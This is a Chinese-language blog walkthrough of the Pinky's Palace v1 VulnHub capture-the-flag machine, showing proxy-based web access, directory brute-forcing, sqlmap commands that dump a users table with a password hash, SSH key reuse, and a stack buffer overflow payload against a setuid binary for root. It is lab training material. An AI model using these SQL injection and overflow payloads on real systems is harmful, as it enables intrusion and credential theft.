> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/p0CgiRgnjlgxoMOKyfOYiw)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **30** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/1YmOavZxdtMO4H2jQmHQPjj5spkbfSVBDXp5qK3AFk28IFicOuyG8bl4JvulVPhB1R6f12L9prx42JccKBibCbNg/640?wx_fmt=png)

  

  

  

靶机地址：https://www.vulnhub.com/entry/pinkys-palace-v1,225/

靶机难度：中级（CTF）

靶机发布日期：2018 年 3 月 6 日

靶机描述：Box 信息：使用仅 DHCP 主机和桥接适配器类型在 VirtualBox 上进行了测试。

难以获得用户：简单 / 中级

扎根困难：容易 / 中级

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrLqELC9icToMglhxxrktVa4kUZic2Xdl44uJ20iaUCAyjamaWNDwndbGhA/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUroz9icxAIXmLV5zzJwUeTBooPa5mWMtgmIPWucEadlIGyrqiaHmd2g5LQ/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.127

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrPume4AZtyTbdNUMbwwc4YsRYEnHia7QPVgtKRToswKfdMIku5sZyfdA/640?wx_fmt=png)

nmap 扫除开放了 8080、31337 和 64666 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrLw1DMuUz0pl0DjroYBfuib0tdEhyTUFe6VvqsAMJUdWAQicw02KojCXw/640?wx_fmt=png)

访问 8080，返回 403 错误... 遇到这种情况通常有两种解释：要么是 WAF（Web 应用程序防火墙）阻止了，要么是服务器配置完全拒绝了访问...

如果是 WAF 阻止了，对于现在的环境有些不可能... 所以应该是服务器拒绝了访问...

因此估计要绕过 http 代理才能访问 Web 服务器... 使用 31337 代理...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUr2lWLtOONp8tk6EQ0xjDzcVaicticGCU4MRxP7QrpuQF9AVssy3BO3AZQ/640?wx_fmt=png)

```
curl --proxy http://192.168.56.127:31337 127.0.0.1:8080
```

这里使用 127.0.0.1 是因为，通过代理传递 http 请求时，127.0.0.1 指向代理服务器的本地主机（192.168.56.127），而不是我们的计算机... 上面验证了可以使用代理去访问...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUr65ic6ptS7fNYfmPkH7pRPdKI0ia2HfjSZviacAl1uibczDXnuRAp2ibbxsg/640?wx_fmt=png)

这边修改浏览器代理为 31337....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrZ7fiaKbgXQmOf6CLIoCwvhTu3xBa6h87oXTSpZYQofYticvSN1eVksLg/640?wx_fmt=png)

然后用本地 IP 去访问 8080 端口... 但是出现的页面没有有效的信息....

这边使用 dirb 或者 gobuster 都可以爆破目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrRxL3fpDbE6iaR9LTHDM0omtnr6jXm2ia5qBtwVMqczcH0Fib6vISQhePw/640?wx_fmt=png)

```
gobuster -p http://192.168.56.127:31337 -u http://127.0.0.1:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

发现 / littlesecrets-main 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrzZqUb87gSwPmMv4gJcEfUkDhiacjeZperRdWtEAldA2SETdxXqialL6w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrkibibz3JicgKuooSPVaURywN9dibZF5R8gAe6k2OdiavYwvKf7oq7aybYYg/640?wx_fmt=png)

尝试 admin 默认账号密码登录跳转到这个界面... 用户密码错误...

当访问 logs.php 时...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrouMMicNSQuMvgOOzkZlGbCkpzmdyltiaVroUyou47bWB2TJuuE2SOiajQ/640?wx_fmt=png)

存在 sql 注入，直接用 sqlmap 扫...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrIwTOlsghTmohLniamzm5BXEDl1uJ0qkIvCt9xwSGlpONhB9Ghr79c6Q/640?wx_fmt=png)

```
sqlmap --url http://127.0.0.1:8080/littlesecrets-main/login.php --level=3 --proxy http://192.168.56.127:31337 --data="user=admin&pass=admin" --dump
```

发现用户代理确实可被利用，我再次配置了 sqlmap，这次在 db 中生成表列表...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUr3ibtwicUkTAIMNdqkdKB993DhCeBm0wZ3XMWL7cv0Rqib3ZrxBRDS398g/640?wx_fmt=png)

```
sqlmap -u http://127.0.0.1:8080/littlesecrets-main/login.php --proxy=http://192.168.56.127:31337 --data="user=user&pass=pass&submit=Login" --level=5 --risk=3 --dbms=mysql --tables
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUreHhlhMnwicXKz0WiaNYGbHFcxYOWCsKLdvt5PeAia8mBqLzDVHhSwoycQ/640?wx_fmt=png)

```
sqlmap -u http://127.0.0.1:8080/littlesecrets-main/login.php --proxy=http://192.168.56.127:31337 --data="user=user&pass=pass&submit=Login" --level=5 --risk=3 --dbms=mysql --dump users
pinkymanage:d60dffed7cc0d87e1f4a11aa06ca73af
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrxuZbzM8Qvups0UaFvibJmKibPrmiaU42AiajJ6MXBBfVEpGvlIaDicZ4W3w/640?wx_fmt=png)

```
pinkymanage 、3pinkysaf33pinkysaf3
```

登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrl1haZcicF0hDjetEb1qHxGR5U5lXyPHibElKx8ibetXYBqGmxmsvfWibxw/640?wx_fmt=png)

不允许 sudo...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUriccPDic7kWD2G4jRVvVtUDjEqb5kjibao3lUUaJ6ztWj8T1zpN2ZYGveg/640?wx_fmt=png)

现在有了用户列表信息.... 注意用户 pinky...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrW0Rsn1gS15oXHG3nMjAy1EuVNQXS39Bd4jlIKFKRot9OFjWmQshPsw/640?wx_fmt=png)

查看了下目录... 确定了用户 pinky 的存在...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUreicviaibSGE29sa5icCLeblcWPjHAldzolb9KG4V6hkZvpEp8TskskK9FA/640?wx_fmt=png)

用户的主目录没有啥内容，限制了很多目录查看... 我进入了 web 目录看... 发现了 note.txt 文件，意思是藏了一个 rsa 密匙在这儿... 进去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUr4yKriaSQn9qEeLxRfiaKSuCToqr0jsFg1iaR0Wibkt7nlLfjsu3GjhHTcw/640?wx_fmt=png)

发现密匙后，前面介绍是 rsa 密匙，这边将内容放到本地上试试能登录吗...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrxVibILgn1Jn6zBlIgJTJqzUPv9PeEv0qWgNicnqdZBP1SALk8ib1sThoA/640?wx_fmt=png)

不能登录，把解码后的 base64 在放入文本试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrNq28Ee1cmhSKH2mgewlS06Zk8QgrfR2Lz4ibJo3t83ZkfWa6qtdFlyQ/640?wx_fmt=png)

  

二、提权

成功登录....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrQfVcgRCuCxia6ibq3bUVeARiaUOWknm34T1yA1Pel4lxWNib98kzuFHCgg/640?wx_fmt=png)

因为没有密码，无法使用 sudo 提权... 这边查看到 adminhelper 二进制文件具有 root 权限... 查看下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrFWYw0Q1HnJiaCXeoU3FhAbOQ1asAVwxQf1A0knwDLBhrEzx7PxhTxuw/640?wx_fmt=png)

同时具有 setuid 和 root 权限...（ELF）这边尝试下是否可以插入 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrD7Bib5MtnYdYU32krmD8wRNF0B7wlwKPpcqJOf853gdmMpfWOYW3VrA/640?wx_fmt=png)

开始执行它没反应... 后来只回复了我一个输入值... 怀疑具有缓冲区溢出... 我试试 python 输入看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrnYlrOiaB5IUhtEJljFiawc1hOIXuRnvv8KQicaiaiaIcKulB8LcDib1IbicNw/640?wx_fmt=png)

```
./adminhelper $(python -c "print 'A'*100")
```

提示分段故障了... 证实了存在缓冲区溢出问题... 这边需要找出堆栈溢出值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrgtuJb5VTqE3xUKVo5ibNQfwxBWBONmCaytnwmIIJKdg92eoNB4gnIXQ/640?wx_fmt=png)

触发段错误找到了段错误的边界为 72....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrfG3dIWSvb4fibEtxicggRG1ZzP84FibFBiawfmGKrq7McaI2PL9ibNvQ1nw/640?wx_fmt=png)

启动 gdb 来检查程序... 发现 spawn 函数（这边可以利用 spanwn 函数进行提权）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrQkMflicYWR24BxSs4icFo6Wauic8LXwbhX3hlDk1oYrJ7kH5B1c78giaIA/640?wx_fmt=png)

我运行了 spawn 函数... 现在我要触发堆栈溢出以重定向程序执行，来覆盖 EIP 中的返回地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUr1h2JYQlhnhhVEyLfDMJOt0qFZ0yLxka3Pkd8pesU4saacKr9ialL5NA/640?wx_fmt=png)

```
gdb --args ./adminhelper $(python -c "print 'A'*72+'B'*6")
```

这边发现了 42，它是 “B” 的十六进制值.... 现在需要重定向执行得想计算出内存地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrAmbr0VaOEr1K1y1hroBgomYlpDy1EoM859TyNepCYuOCgUJ3cuCdSg/640?wx_fmt=png)

看到目标内存地址是 0x00005555555547d0，创建外壳需要注入了 5555555547d0，以避免在 shellcode 中有空字节.... 在 shellcode 中，字节顺序相反，因为该体系结构为低端字节序... 所以：（\xd0\x47\x55\x55\x55\x55）

很好理解...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrfs8TGCWcxT4zQic3EOjIVicAiaQOtyo3dOG707upbwQPb9HlEOltP7Khg/640?wx_fmt=png)

```
./adminhelper $(python -c "print 'A'*72+'\xd0\x47\x55\x55\x55\x55'")
```

这边利用缓冲区溢出的栈溢出执行了外壳成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMBOUkgqV9Q427iaSuJiahNUrPmIg354ajlDr8BiaK1L6LOXo4PYfWHEzWB4o80OGe3O5ibU1LSBTyOAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/1YmOavZxdtMO4H2jQmHQPjj5spkbfSVBDXp5qK3AFk28IFicOuyG8bl4JvulVPhB1R6f12L9prx42JccKBibCbNg/640?wx_fmt=png)

  

  

  

成功利用 shell 获取了 root 权限... 由于此靶机都安装了 python 等工具能直接利用在内部对二进制漏洞制作 shell，才顺利的拿到了 root 和查看到了 flag....

加油！！！！

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)